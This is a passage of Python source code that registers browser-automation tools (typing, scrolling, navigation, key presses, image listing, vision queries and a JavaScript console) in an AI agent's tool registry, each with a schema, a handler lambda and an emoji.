    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
